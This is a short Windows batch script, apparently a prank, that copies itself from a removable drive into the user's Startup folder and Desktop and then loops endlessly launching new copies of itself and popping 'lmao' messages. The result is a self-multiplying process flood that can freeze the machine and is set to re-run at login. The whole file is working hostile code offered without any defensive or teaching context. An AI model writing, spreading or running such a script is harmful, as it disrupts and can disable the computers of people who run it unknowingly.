@ECHO on
title lol gottem
copy %~d0\hax.bat c:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\
copy %~d0\hax.bat C:\Users\%USERNAME%\Desktop\
start C:\Users\%USERNAME%\Desktop\hax.bat
cd c:\
:FIRSTSECTION
start c:\Users\%USERNAME%\Desktop\hax.bat
msg * "lmao"
tree
goto :FIRSTSECTION
